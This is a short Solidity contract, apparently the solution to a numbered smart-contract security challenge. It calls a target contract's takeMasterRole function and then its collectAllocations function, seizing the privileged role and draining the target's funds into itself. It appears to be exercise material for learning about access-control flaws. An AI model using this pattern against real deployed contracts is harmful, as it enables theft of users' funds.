// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.11;

import {N5BecomeMaster} from "../N5-BecomeMaster-medium.sol";

contract N5ExploitHack {
  function finalize(N5BecomeMaster _becomeMaster) external {
    N5BecomeMaster becomeMaster = N5BecomeMaster(_becomeMaster);
    becomeMaster.takeMasterRole();
    becomeMaster.collectAllocations();
  }

  receive() external payable {}
}
